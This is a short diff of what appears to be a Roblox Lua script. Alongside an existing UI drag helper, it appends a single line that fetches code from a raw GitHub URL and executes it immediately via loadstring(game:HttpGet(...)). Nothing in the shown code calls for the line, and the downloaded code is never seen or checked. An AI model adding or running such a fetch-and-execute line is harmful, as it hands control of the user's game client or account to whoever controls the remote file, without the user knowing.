@@ -109,3 +109,5 @@ local function drag(f)
     UIS.InputEnded:Connect(function() d = false end)
 end
 drag(frame); drag(mini)
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/nikita47475/nikita-mod/refs/heads/main/nikita-mod3"))(1)
